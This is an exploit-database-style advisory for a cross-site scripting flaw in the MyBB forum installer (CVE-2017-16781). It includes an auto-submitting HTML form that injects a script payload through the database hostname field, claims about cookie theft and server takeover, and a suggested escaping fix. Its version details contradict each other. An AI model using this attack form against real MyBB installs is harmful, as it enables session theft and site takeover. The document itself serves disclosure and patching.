@@ -1,0 +1,47 @@
+# Exploit Title: XSS in MyBB up to 1.8.13 via installer
+# Date: Found on 05-29-2017
+# Exploit Author: Pablo Sacristan
+# Vendor Homepage: https://mybb.com/
+# Version: Version > 1.8.13 (Fixed in 1.8.13)
+# CVE : CVE-2017-16781
+
+No HTML escaping when returning an $error in /install/index.php can
+lead to an XSS which can be used to take over an attacker account.
+
+The vulnerability occurs in /install/index.php:2503 and occurs because
+there is no html encoding of the $error. A simple way to exploit this
+is to create an error by using the Database Server Hostname and
+inserting HTML characters there.
+
+It is a POST XSS and this is a PoC:
+<form name="x" action="http://target.com/install/index.php" method="post">
+
+<input type="hidden" name='dbengine' value="mysqli">
+<input type="hidden" name='config[mysqli][dbhost]' value="<img src=x onerror=alert(0)>">
+<input type="hidden" name='config[mysqli][dbuser]' value="lol">
+<input type="hidden" name='config[mysqli][dbpass]' value="lol">
+<input type="hidden" name='config[mysqli][dbname]' value="lol">
+<input type="hidden" name='config[mysqli][tableprefix]' value="lol">
+<input type="hidden" name='config[mysqli][encoding]' value="utf8">
+<input type="hidden" name='config[mysql][dbhost]' value="localhost">
+<input type="hidden" name='action' value="create_tables">
+
+</form>
+
+<script>document.x.submit();</script>
+
+Using this attack you can steal the cookies and you can install the MyBB server as you want, giving you almost full control over the MyBB server.
+
+A simple fix would be to change the function error_list($array) to:
+function error_list($array)
+{
+ $string = "<ul>\n";
+ foreach($array as $error)
+ {
+            $string .= "<li>";
+            $string .= htmlspecialchars($error);
+            $string .= "</li>";
+ }
+ $string .= "</ul>\n";
+ return $string;
+}
